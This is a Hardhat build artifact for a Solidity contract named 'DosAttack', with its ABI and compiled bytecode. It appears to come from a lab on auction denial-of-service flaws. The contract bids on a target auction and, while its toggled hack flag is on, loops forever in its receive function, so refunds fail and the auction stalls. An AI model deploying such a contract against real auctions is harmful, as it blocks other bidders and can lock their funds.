{
  "_format": "hh-sol-artifact-1",
  "contractName": "DosAttack",
  "sourceName": "contracts/Dos.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_auction",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "doBid",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "toggleHack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60806040526001600060146101000a81548160ff02191690831515021790555034801561002b57600080fd5b5060405161044e38038061044e833981810160405281019061004d91906100e9565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061015b565b6000815190506100e381610144565b92915050565b6000602082840312156100fb57600080fd5b6000610109848285016100d4565b91505092915050565b600061011d82610124565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b61014d81610112565b811461015857600080fd5b50565b6102e48061016a6000396000f3fe60806040526004361061002d5760003560e01c80637e72e1d1146100d1578063815aba8e146100e8576100cc565b366100cc5760011515600060149054906101000a900460ff1615151415610060575b60011561005b5761004f565b6100ca565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f193505050501580156100c8573d6000803e3d6000fd5b505b005b600080fd5b3480156100dd57600080fd5b506100e66100f2565b005b6100f06101ae565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610182576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161017990610254565b60405180910390fd5b600060149054906101000a900460ff1615600060146101000a81548160ff021916908315150217905550565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631998aeef346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561021657600080fd5b505af115801561022a573d6000803e3d6000fd5b5050505050565b600061023e600683610274565b915061024982610285565b602082019050919050565b6000602082019050818103600083015261026d81610231565b9050919050565b600082825260208201905092915050565b7f6661696c6564000000000000000000000000000000000000000000000000000060008201525056fea2646970667358221220bb8afe089133438777feb1e10636519add67bb16d1d9f3a88d6a60f7d8185c4364736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}